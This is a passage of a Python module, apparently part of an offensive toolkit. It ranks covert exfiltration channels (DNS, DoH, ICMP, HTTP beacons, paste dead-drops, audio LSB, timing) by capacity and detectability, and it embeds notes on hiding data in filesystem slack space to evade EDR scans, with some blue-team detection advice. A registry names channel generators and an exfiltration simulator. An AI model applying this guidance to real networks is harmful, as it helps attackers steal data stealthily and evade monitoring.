    ("doh_txt_b32",    90,     5.0,  0.55, (4, 6, 6, 4)),
    ("icmp_echo",      48,     10.0, 0.10, (8, 5, 6, 6)),
    ("http_beacon_hdr", 512,   0.5,  0.35, (2, 4, 7, 3)),
    ("https_post",     8192,   2.0,  0.25, (1, 3, 5, 2)),
    ("paste_deaddrop", 65536,  0.1,  0.33, (3, 4, 1, 2)),
    ("qr_render",      231,    0.2,  0.0,  (1, 2, 1, 1)),
    ("wav_lsb",        1000,   1.0,  0.02, (2, 2, 1, 1)),
    ("timing_gap",     1,      8.0,  0.05, (6, 1, 4, 2)),
]


def nm20_data_channel_matrix(args):
    """REAL computed channel comparison: capacity/detectability table + CSV artifact."""
    r = _base("channel_matrix")
    weights = {"uncommon_proto": 0.30, "high_entropy": 0.25,
               "regularity": 0.25, "volume_anomaly": 0.20}
    notes = {
        "dns_txt_b32": "classic; no direct conn needed; resolver logs everything",
        "doh_txt_b32": "blends with legit DoH; TLS hides content, not endpoint/volume",
        "icmp_echo": "often unlogged by flow tools; needs root; many nets rate-limit",
        "http_beacon_hdr": "low & slow; header slots small; jitter breaks regularity",
        "https_post": "highest capacity; looks like API traffic; volume anomaly is main risk",
        "paste_deaddrop": "asynchronous; no direct C2; paste-site retention is the risk",
        "qr_render": "air-gap/visual channel; human or camera in loop",
        "wav_lsb": "media carrier; needs a drop point; LSB detection via chi-square",
        "timing_gap": "very low capacity; nearly invisible in payload inspection",
    }
    rows = []
    for name, payload, ups, ovh, feats in _CHANNEL_MODEL:
        cap_bps = payload * 8.0 * ups * (1.0 - ovh)
        det = 10.0 * sum(w * f for w, f in zip(weights.values(), feats))
        rows.append({
            "channel": name,
            "capacity_bps": round(cap_bps, 1),
            "detectability_0_100": round(det, 1),
            "stealth_per_kbit": round((100.0 - det) / (cap_bps / 1000.0 + 1.0), 3),
            "notes": notes[name],
        })
    rows.sort(key=lambda x: -x["capacity_bps"])
    csv = _write_artifact("nm20_channel_matrix.csv",
                          "channel,capacity_bps,detectability,stealth_per_kbit\n" +
                          "\n".join("%s,%s,%s,%s" % (x["channel"], x["capacity_bps"],
                                                     x["detectability_0_100"],
                                                     x["stealth_per_kbit"]) for x in rows) + "\n")
    r["ok"] = True
    r["weights"] = weights
    r["model"] = "capacity=payload*8*units/s*(1-overhead); detectability=weighted feature sum x10"
    r["table"] = rows
    r["csv_artifact"] = csv
    r["fastest"] = rows[0]["channel"]
    r["stealthiest"] = min(rows, key=lambda x: x["detectability_0_100"])["channel"]
    return r


_SLACK_NOTE_TMPL = """# Slack-space data hiding - research notes (nm20.data.slack_space_note)

## Live numbers from this host (real os.statvfs on %(tmp)s)
- filesystem block size (f_bsize): %(bsize)d bytes
- fundamental fragment size (f_frsize): %(frsize)d bytes
- => a 1-byte file here still allocates one block; the slack tail is ~bsize-1 bytes.

## Concepts
- **File slack**: bytes between logical EOF and the end of the final allocated
  block. Writing there leaves file size, mtime, and hashes (of logical content)
  unchanged; the data rides along invisibly to `cat`, `cp`, and most EDR
  file-content scans.
- **RAM slack vs drive slack**: the tail from EOF to end of the last *sector*
  may be zeroed from memory by the OS (RAM slack); from sector end to block end
  is whatever was on disk before (drive slack) - the more reliable hiding area.
- **bmap technique** (linux): use the block-mapping ioctl (FIBMAP, or FIEMAP on
  modern kernels) to find the file's last block on disk, then write the payload
  at offset (filesize rounded up to sector) inside that block via the raw
  device. Requires root and a filesystem that doesn't reallocate on write
  (ext2/3/4 yes; CoW fs like btrfs/zfs will relocate - don't bother).
- **Partition slack**: gap between end of last partition and end of disk
  (check with `blockdev --getsz` vs partition table); invisible to the fs layer.

## Detection (blue team)
- Compare allocated blocks x blocksize vs logical size for every file
  (`stat` gives both: st_blocks*512 vs st_size); carve and hash the tail.
- `fsstat`/`istat` (sleuthkit) and `bmap -mode slack` style readers.
- Entropy of slack tails: legit drive slack tends to be old fs data; fresh
  high-entropy tails on many files = hiding tool (see nm20.data.entropy_scan).
- CoW/journaling filesystems and thin-provisioned volumes shrink the attack.

## Reality check
- Needs root (raw device or FIEMAP+direct write) on any modern hardened box.
- SSDs with TRIM/discard and filesystems with CoW erase or relocate slack.
- Cloud/VM images snapshot at block level: slack *is* captured by forensics
  images, so this hides from live triage, not from full-disk acquisition.
"""


def nm20_data_slack_space_note(args):
    """Research artifact: slack-space hiding notes + real statvfs numbers for /tmp."""
    r = _base("slack_space_note")
    try:
        st = os.statvfs(TMPDIR)
        note = _SLACK_NOTE_TMPL % {"tmp": TMPDIR, "bsize": st.f_bsize, "frsize": st.f_frsize}
        r["statvfs"] = {"f_bsize": st.f_bsize, "f_frsize": st.f_frsize,
                        "f_blocks": st.f_blocks, "f_bavail": st.f_bavail}
    except OSError as e:
        note = _SLACK_NOTE_TMPL % {"tmp": TMPDIR, "bsize": -1, "frsize": -1}
        r["statvfs_error"] = str(e)
    p = _write_artifact("nm20_slack_space_notes.md", note)
    r["ok"] = True
    r["artifact"] = p
    r["bytes"] = os.path.getsize(p)
    r["requires"] = "root + non-CoW filesystem for the bmap technique"
    return r


POWERS = {
    "nm20.data.b64_stream": nm20_data_b64_stream,
    "nm20.data.b85_stream": nm20_data_b85_stream,
    "nm20.data.hex_stream": nm20_data_hex_stream,
    "nm20.data.xor_stream": nm20_data_xor_stream,
    "nm20.data.gzip_pack": nm20_data_gzip_pack,
    "nm20.data.zsteg_chunks": nm20_data_zsteg_chunks,
    "nm20.data.encode_chain": nm20_data_encode_chain,
    "nm20.data.decode_chain": nm20_data_decode_chain,
    "nm20.data.cover_text_gen": nm20_data_cover_text_gen,
    "nm20.data.entropy_scan": nm20_data_entropy_scan,
    "nm20.data.file_carve": nm20_data_file_carve,
    "nm20.data.qr_encode": nm20_data_qr_encode,
    "nm20.data.stego_wav": nm20_data_stego_wav,
    "nm20.data.dns_channel_gen": nm20_data_dns_channel_gen,
    "nm20.data.icmp_channel_gen": nm20_data_icmp_channel_gen,
    "nm20.data.http_beacon_gen": nm20_data_http_beacon_gen,
    "nm20.data.doh_channel_plan": nm20_data_doh_channel_plan,
    "nm20.data.paste_channel_gen": nm20_data_paste_channel_gen,
    "nm20.data.timing_channel_gen": nm20_data_timing_channel_gen,
    "nm20.data.exfil_sim": nm20_data_exfil_sim,
    "nm20.data.rate_limiter": nm20_data_rate_limiter,
    "nm20.data.channel_matrix": nm20_data_channel_matrix,
    "nm20.data.slack_space_note": nm20_data_slack_space_note,
}

if __name__ == "__main__":
    print(json.dumps(POWERS["nm20.data.channel_matrix"]({}), indent=2, default=str))
